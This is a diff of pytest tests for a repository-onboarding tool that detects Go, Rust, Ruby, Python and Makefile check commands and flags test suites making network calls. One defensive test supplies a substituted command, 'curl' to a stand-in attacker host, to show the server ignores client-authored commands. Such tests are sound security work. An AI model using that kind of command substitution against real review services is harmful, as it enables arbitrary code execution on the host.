@@ -236,3 +236,372 @@ def test_create_worktree_refuses_to_clobber_a_non_worktree_dir(node_repo, tmp_pa
     ok, out = prov.create_worktree(str(node_repo), str(sandbox))
     assert not ok and "refusing to overwrite" in out
     assert (sandbox / "important.txt").is_file()
+
+
+# ---------------------------------------------------------------------------
+# Other stacks (Slice 3)
+#
+# The npm path has been the only one that detected real commands; Go, Rust,
+# Ruby and pytest were recognized as "a manifest exists" and nothing more. A
+# repo onboarded that way has an empty checks list, which makes the review
+# gate a no-op -- it passes every change because it runs nothing. These tests
+# hold the three properties that matter for the new stacks: the commands are
+# the repo's own, a suite that calls the network still arrives disabled, and
+# the client still cannot author what the review service executes.
+# ---------------------------------------------------------------------------
+
+def _names(report):
+    return [c["name"] for c in report.checks]
+
+
+def _cmd(report, name):
+    c = next(c for c in report.checks if c["name"] == name)
+    return " ".join([c["cmd"], *c["args"]])
+
+
+@pytest.fixture
+def go_repo(tmp_path):
+    repo = tmp_path / "ledger"
+    (repo / "internal").mkdir(parents=True)
+    (repo / "go.mod").write_text("module example.com/ledger\n\ngo 1.22\n")
+    (repo / "internal" / "sum_test.go").write_text(
+        "package internal\n\nfunc TestSum(t *testing.T) { _ = 1 + 1 }\n")
+    _git_init(repo)
+    return repo
+
+
+def test_go_repo_gets_real_commands_not_just_a_language_label(go_repo):
+    r = prov.detect_project(str(go_repo))
+    assert r.languages == ["go"]
+    assert _names(r) == ["vet", "build", "test"]
+    assert _cmd(r, "test") == "go test ./..."
+    assert _cmd(r, "vet") == "go vet ./..."
+    assert r.risky_scripts == []
+    assert {"dir": ".", "cmd": "go", "args": ["build", "./..."]} in r.build_steps
+
+
+def test_golangci_lint_is_proposed_only_when_the_repo_configures_it(go_repo):
+    assert "lint" not in _names(prov.detect_project(str(go_repo)))
+    (go_repo / ".golangci.yml").write_text("linters:\n  enable: [govet]\n")
+    r = prov.detect_project(str(go_repo))
+    assert _cmd(r, "lint") == "golangci-lint run"
+
+
+def test_go_suite_that_calls_the_network_is_not_a_check(tmp_path):
+    """The trading-bot rule, applied where there are no script names to flag:
+    the unit of suspicion is the suite, because `go test ./...` is."""
+    repo = tmp_path / "gotrader"
+    repo.mkdir()
+    (repo / "go.mod").write_text("module example.com/gotrader\n")
+    (repo / "trade_test.go").write_text(
+        'package main\n\nimport "net/http"\n\n'
+        'func TestOpen(t *testing.T) { http.Post("https://a-live-service/trade/open", "", nil) }\n')
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    assert "test" not in _names(r), "a suite that POSTs at a live service is not auto-enabled"
+    flagged = {c.value: c for c in r.risky_scripts}
+    assert flagged["test"].enabled is False
+    assert flagged["test"].warning
+    assert "trade_test.go" in flagged["test"].reason
+    assert flagged["test"].check["args"] == ["test", "./..."], \
+        "the candidate carries the exact command the operator would be enabling"
+    assert any("network calls" in w for w in r.warnings)
+
+
+def test_pure_go_tests_are_not_flagged(go_repo):
+    r = prov.detect_project(str(go_repo))
+    assert "test" in _names(r)
+    assert r.risky_scripts == []
+
+
+def test_a_makefile_review_target_is_the_cross_language_test_review(tmp_path):
+    repo = tmp_path / "curated-go"
+    repo.mkdir()
+    (repo / "go.mod").write_text("module example.com/curated\n")
+    (repo / "live_test.go").write_text(
+        'package main\nimport "net/http"\nfunc TestLive(t *testing.T){ http.Get("https://prod/x") }\n')
+    (repo / "Makefile").write_text(
+        ".PHONY: test test-review\ntest:\n\tgo test ./...\ntest-review:\n\tgo test -short ./...\n")
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "make test-review", "the repo's own safe list wins"
+    # the unguarded suite stays on offer, under a name of its own
+    flagged = {c.value: c for c in r.risky_scripts}
+    assert flagged["test-all"].enabled is False
+    assert flagged["test-all"].check["args"] == ["test", "./..."]
+
+
+def test_rust_checks_follow_the_repo_s_own_configuration(tmp_path):
+    repo = tmp_path / "crate"
+    (repo / "src").mkdir(parents=True)
+    (repo / "Cargo.toml").write_text("[package]\nname = 'crate'\n")
+    (repo / "src" / "lib.rs").write_text("pub fn a() {}\n\n#[test]\nfn t() { assert!(true); }\n")
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    assert r.languages == ["rust"]
+    assert _names(r) == ["build", "test"], "no rustfmt.toml and no clippy.toml means neither is proposed"
+    assert _cmd(r, "test") == "cargo test"
+    assert {"dir": ".", "cmd": "cargo", "args": ["build", "--release"]} in r.build_steps
+
+    (repo / "rustfmt.toml").write_text("edition = '2021'\n")
+    (repo / "clippy.toml").write_text("msrv = '1.70'\n")
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "fmt") == "cargo fmt -- --check"
+    # without -D warnings clippy exits 0 on everything it reports
+    assert _cmd(r, "lint") == "cargo clippy --all-targets -- -D warnings"
+
+
+def test_rust_source_without_a_test_attribute_is_not_scanned_as_a_test(tmp_path):
+    """*.rs is the whole crate, not its tests. A client module that calls out
+    is the code under review, not a suite that acts on production."""
+    repo = tmp_path / "client-crate"
+    (repo / "src").mkdir(parents=True)
+    (repo / "Cargo.toml").write_text("[package]\nname = 'c'\n")
+    (repo / "src" / "http.rs").write_text(
+        "pub fn get() { reqwest::blocking::get(\"https://api.example.com\").unwrap(); }\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert "test" in _names(r) and r.risky_scripts == []
+
+    (repo / "tests").mkdir()
+    (repo / "tests" / "live.rs").write_text(
+        "#[test]\nfn hits() { reqwest::blocking::get(\"https://prod/x\").unwrap(); }\n")
+    r = prov.detect_project(str(repo))
+    assert "test" not in _names(r)
+    assert [c.value for c in r.risky_scripts] == ["test"]
+
+
+def test_cargo_alias_is_rust_s_declared_review_suite(tmp_path):
+    repo = tmp_path / "aliased"
+    (repo / ".cargo").mkdir(parents=True)
+    (repo / "tests").mkdir()
+    (repo / "Cargo.toml").write_text("[package]\nname = 'a'\n")
+    (repo / ".cargo" / "config.toml").write_text(
+        "[alias]\ntest-review = \"test --lib\"\n")
+    (repo / "tests" / "live.rs").write_text(
+        "#[test]\nfn hits() { reqwest::get(\"https://prod\"); }\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "cargo test-review"
+    assert [c.value for c in r.risky_scripts] == ["test-all"]
+
+
+def test_ruby_rspec_project(tmp_path):
+    repo = tmp_path / "rubyapp"
+    (repo / "spec").mkdir(parents=True)
+    (repo / "Gemfile").write_text("source 'https://rubygems.org'\ngem 'rspec'\n")
+    (repo / "Gemfile.lock").write_text("")
+    (repo / ".rubocop.yml").write_text("AllCops:\n  NewCops: enable\n")
+    (repo / "spec" / "calc_spec.rb").write_text("describe('calc') { expect(1 + 1).to eq 2 }\n")
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    assert "ruby" in r.languages
+    assert _cmd(r, "lint") == "bundle exec rubocop"
+    assert _cmd(r, "test") == "bundle exec rspec"
+    assert {"dir": ".", "cmd": "bundle", "args": ["install"]} in r.build_steps
+
+
+def test_ruby_minitest_project_uses_rake(tmp_path):
+    repo = tmp_path / "rakeapp"
+    (repo / "test").mkdir(parents=True)
+    (repo / "Gemfile").write_text("source 'https://rubygems.org'\n")
+    (repo / "Rakefile").write_text("task :test do\nend\n")
+    (repo / "test" / "calc_test.rb").write_text("assert_equal 2, 1 + 1\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "bundle exec rake test"
+
+
+def test_ruby_without_a_gemfile_does_not_pretend_to_have_bundler(tmp_path):
+    repo = tmp_path / "plainruby"
+    (repo / "spec").mkdir(parents=True)
+    (repo / ".ruby-version").write_text("3.3.0\n")
+    (repo / "spec" / "x_spec.rb").write_text("describe('x') { }\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "rspec"
+
+
+def test_ruby_rake_review_task_wins_over_the_full_suite(tmp_path):
+    repo = tmp_path / "curated-ruby"
+    (repo / "spec").mkdir(parents=True)
+    (repo / "Gemfile").write_text("source 'https://rubygems.org'\n")
+    (repo / "Rakefile").write_text("namespace :test do\n  task :review do\n  end\nend\n")
+    (repo / "spec" / "live_spec.rb").write_text(
+        "describe('live') { Net::HTTP.get(URI('https://prod/x')) }\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "bundle exec rake test:review"
+    assert [c.value for c in r.risky_scripts] == ["test-all"]
+
+
+def test_makefile_is_the_fallback_for_a_repo_with_no_manifest(tmp_path):
+    repo = tmp_path / "shellproj"
+    repo.mkdir()
+    (repo / "Makefile").write_text("test:\n\t./run-tests.sh\nlint:\n\tshellcheck *.sh\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert r.languages == []
+    assert _names(r) == ["lint", "test"]
+    assert _cmd(r, "test") == "make test"
+    assert any("Makefile targets" in w and "network calls" in w for w in r.warnings), \
+        "a target cannot be read the way a test file can -- say so rather than implying it was checked"
+
+
+def test_makefile_without_a_test_target_proposes_no_test_check(tmp_path):
+    repo = tmp_path / "nomaketest"
+    repo.mkdir()
+    (repo / "Makefile").write_text("build:\n\tgcc -o x x.c\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _names(r) == ["build"]
+    assert any("no automated checks" not in w for w in r.warnings)
+
+
+def test_makefile_is_not_consulted_when_a_real_stack_was_detected(tmp_path):
+    """A Go repo whose Makefile wraps the same commands must not get both."""
+    repo = tmp_path / "gomake"
+    repo.mkdir()
+    (repo / "go.mod").write_text("module example.com/gm\n")
+    (repo / "Makefile").write_text("test:\n\tgo test ./...\nlint:\n\tgolangci-lint run\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert _cmd(r, "test") == "go test ./...", "the stack's own command, not the wrapper"
+    assert not any(c["cmd"] == "make" for c in r.checks)
+
+
+def test_a_polyglot_repo_keeps_both_stacks_with_stable_names(tmp_path):
+    repo = tmp_path / "poly"
+    repo.mkdir()
+    (repo / "package.json").write_text(json.dumps({"scripts": {"lint": "eslint .", "test": "vitest run"}}))
+    (repo / "package-lock.json").write_text("{}")
+    (repo / "go.mod").write_text("module example.com/poly\n")
+    (repo / "main_test.go").write_text("package main\n\nfunc TestX(t *testing.T) {}\n")
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    assert r.languages == ["node", "go"]
+    assert _names(r) == ["lint", "test", "go-vet", "go-build", "go-test"], \
+        "the second stack is prefixed wholesale, so no name is silently replaced"
+    assert _cmd(r, "test") == "npm run test"
+    assert _cmd(r, "go-test") == "go test ./..."
+
+
+def test_a_polyglot_flagged_suite_is_renamed_with_its_check(tmp_path):
+    """A candidate's name is how validate_choices finds the command it stands
+    for; if the check is renamed and the candidate is not, enabling it would
+    resolve to the wrong stack's suite."""
+    repo = tmp_path / "poly-net"
+    repo.mkdir()
+    (repo / "package.json").write_text(json.dumps({"scripts": {"test": "vitest run"}}))
+    (repo / "package-lock.json").write_text("{}")
+    (repo / "go.mod").write_text("module example.com/pn\n")
+    (repo / "live_test.go").write_text(
+        'package main\nimport "net/http"\nfunc TestL(t *testing.T){ http.Get("https://prod/x") }\n')
+    _git_init(repo)
+
+    r = prov.detect_project(str(repo))
+    flagged = {c.value: c for c in r.risky_scripts}
+    assert "go-test" in flagged
+    assert flagged["go-test"].check["name"] == "go-test"
+    assert flagged["go-test"].check["args"] == ["test", "./..."]
+
+    clean = prov.validate_choices(r, {"checks": [{"name": "go-test"}]})
+    assert clean["checks"][0]["cmd"] == "go"
+    assert clean["checks"][0]["args"] == ["test", "./..."]
+
+
+def test_enabling_a_flagged_suite_runs_our_command_not_the_client_s(tmp_path):
+    """The wizard is an approval step. A client that echoes back a different
+    cmd/args under a proposed name gets the server's version regardless --
+    the review service executes these verbatim."""
+    repo = tmp_path / "gonet2"
+    repo.mkdir()
+    (repo / "go.mod").write_text("module example.com/g2\n")
+    (repo / "x_test.go").write_text(
+        'package main\nimport "net/http"\nfunc TestX(t *testing.T){ http.Get("https://prod") }\n')
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+
+    clean = prov.validate_choices(r, {"checks": [
+        {"name": "test", "dir": ".", "cmd": "curl", "args": ["https://attacker/x"], "timeoutMs": 1},
+    ]})
+    assert clean["checks"] == [{"name": "test", "dir": ".", "cmd": "go",
+                                "args": ["test", "./..."],
+                                "timeoutMs": prov.TEST_TIMEOUT_MS_DEFAULT}]
+
+    with pytest.raises(prov.ProvisioningError):
+        prov.validate_choices(r, {"checks": [{"name": "test-all"}]})
+
+
+def test_python_suite_calling_the_network_is_flagged_too(tmp_path):
+    """pytest has no per-suite script names either, so it gets the same rule
+    the npm path has had since the trading-bot incident."""
+    repo = tmp_path / "pynet"
+    (repo / "tests").mkdir(parents=True)
+    (repo / "pyproject.toml").write_text("[project]\nname = 'x'\n")
+    (repo / "tests" / "test_live.py").write_text(
+        "import requests\n\ndef test_live():\n    requests.post('https://prod/orders')\n")
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert "test" not in _names(r)
+    assert [c.value for c in r.risky_scripts] == ["test"]
+    assert r.risky_scripts[0].check["args"] == ["-m", "pytest", "-q"]
+
+
+def test_vendored_and_ignored_directories_are_not_scanned(tmp_path):
+    """A networked test inside vendor/ or node_modules/ is someone else's
+    code. Flagging the repo's own suite for it would train the operator to
+    enable flagged suites without reading them."""
+    repo = tmp_path / "vendored"
+    (repo / "vendor" / "dep").mkdir(parents=True)
+    (repo / "node_modules" / "pkg").mkdir(parents=True)
+    (repo / "go.mod").write_text("module example.com/v\n")
+    (repo / "own_test.go").write_text("package main\n\nfunc TestOwn(t *testing.T) {}\n")
+    (repo / "vendor" / "dep" / "dep_test.go").write_text(
+        'package dep\nimport "net/http"\nfunc TestD(t *testing.T){ http.Get("https://x") }\n')
+    (repo / "node_modules" / "pkg" / "pkg_test.go").write_text(
+        'package pkg\nimport "net/http"\nfunc TestP(t *testing.T){ http.Post("https://y", "", nil) }\n')
+    _git_init(repo)
+    r = prov.detect_project(str(repo))
+    assert "test" in _names(r)
+    assert r.risky_scripts == []
+
+
+def test_the_suite_scan_is_bounded(tmp_path, monkeypatch):
+    """This runs inside a wizard click. A monorepo with ten thousand test
+    files must not turn that into a minute of IO."""
+    repo = tmp_path / "huge"
+    repo.mkdir()
+    (repo / "go.mod").write_text("module example.com/h\n")
+    for i in range(30):
+        (repo / f"a{i:03d}_test.go").write_text("package main\n")
+    _git_init(repo)
+
+    opened = []
+    real_read = Path.read_text
+
+    def counting_read(self, *a, **kw):
+        opened.append(str(self))
+        return real_read(self, *a, **kw)
+
+    monkeypatch.setattr(prov, "_SCAN_FILE_LIMIT", 5)
+    monkeypatch.setattr(Path, "read_text", counting_read)
+    prov.detect_project(str(repo))
+    assert len([p for p in opened if p.endswith("_test.go")]) <= 5
+
+
+def test_a_missing_toolchain_is_a_warning_not_a_silent_failure(go_repo, monkeypatch):
+    """The review service runs checks on this host. A missing `go` means every
+    review of this project fails, forever, for a reason nothing else states."""
+    monkeypatch.setattr(prov.shutil, "which", lambda c: None if c == "go" else f"/usr/bin/{c}")
+    r = prov.detect_project(str(go_repo))
+    assert any("go not on PATH" in w for w in r.warnings)
+
+    monkeypatch.setattr(prov.shutil, "which", lambda c: f"/usr/bin/{c}")
+    r = prov.detect_project(str(go_repo))
+    assert not any("not on PATH" in w for w in r.warnings)
